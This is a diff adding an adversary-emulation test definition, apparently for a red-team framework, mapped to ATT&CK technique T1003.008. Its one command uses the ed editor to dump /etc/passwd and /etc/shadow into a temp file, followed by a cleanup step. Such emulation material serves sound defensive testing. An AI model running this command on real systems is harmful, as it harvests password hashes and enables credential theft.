@@ -1,0 +1,15 @@
+- description: 'Dump /etc/passwd and /etc/shadow using ed
+
+    '
+  id: 9e771275f11328252ac359ee3cc2f32c
+  name: Access /etc/{shadow,passwd} with a standard bin that's not cat
+  platforms:
+    linux:
+      sh:
+        cleanup: rm -f /tmp/T1003.008.txt
+        command: echo -e "e /etc/passwd\n,p\ne /etc/shadow\n,p\n" | ed > /tmp/T1003.008.txt
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1003.008
+    name: 'OS Credential Dumping: /etc/passwd and /etc/shadow'
